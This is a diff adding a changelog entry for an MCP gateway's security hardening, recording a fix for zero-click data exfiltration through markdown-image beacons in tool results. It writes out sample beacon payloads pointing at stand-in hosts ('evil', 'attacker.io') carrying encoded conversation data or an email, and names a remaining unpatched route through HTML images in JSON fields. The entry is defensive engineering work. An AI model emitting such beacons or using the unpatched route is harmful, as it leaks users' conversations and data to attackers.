@@ -855,6 +855,24 @@
     test_mcp_ext_withhold_audit.py (5, assert _record_gateway_event fired with the right decision/reason). Gate:
     5 + 1558 gateway passed 0 failed; broker 108. Evidence mcp-parallel/findings/backstop-p-ext-withhold-audit/.
     RESIDUAL: domain-not-allowlisted 403 (before _ext_audit def, static input reject) left unaudited by design.
+  - CHG-0096 (2026-07-03) — HIGH zero-click exfil: MCP tool RESULTS were not defanged for auto-render exfil
+    BEACONS. The chat guard defangs markdown-image ![x](https://evil/?d=<data>) / bare beacon URLs via
+    neutralize_exfil_channels, but the MCP result scan (orchestrator _scan_text_tier1) only ran redact_all —
+    masking recognized PII/secrets but NOT the beacon STRUCTURE. A malicious upstream result with
+    ![x](https://evil/?d=<b64-of-conversation>) (opaque payload the regexes miss) egressed as a live
+    auto-render beacon a markdown client AUTO-FETCHES on render → zero-click exfil; this egress BYPASSES the
+    chat output guard (separate API surface). FIX: (1) _scan_text_tier1 runs neutralize_exfil_channels on the
+    RAW text (before redact_all so the payload is visible to _url_smuggles_data), adds an 'exfil' finding, sets
+    mutation to redact_all(neutralized) or neutralized; gated enforcement != monitor. (2) tier1 only applies a
+    mutation under redact, so added _findings_have_exfil + OR'd into the E12 floor's redact-trigger at all 3
+    sites (mcp_proxy.py) — CHG-0074 pattern — so defang fires under the default 'tag' posture. NEW TEST
+    test_mcp_result_exfil_beacon_defang.py (10). Gate: 10 + 1568 gateway passed 0 failed; broker 108. Byte-level:
+    ![a](.../?leak=john.doe@corp.example) -> [a](https://attacker.io/[exfil-redacted]); 5 benign unchanged.
+    ORACLE NOTE: aidefence blind here (rated raw ?leak=<email> beacon hasPII=false — doesn't parse PII in URL
+    query); byte-level + behavior test authoritative. Evidence mcp-parallel/findings/backstop-p-result-exfil-
+    beacon/. RESIDUAL: HTML <img>/srcset nested in a JSON result field NOT defanged (whole-payload JSON scan
+    escapes the attribute quotes; HTML regexes miss them) — markdown/bare-URL ARE defanged; per-field
+    neutralization is a future item.
 
 ## Ralph autonomous loop — gateway hardening
 - Backlog + status live in scripts/ralph/prd.json; learnings in scripts/ralph/progress.txt.
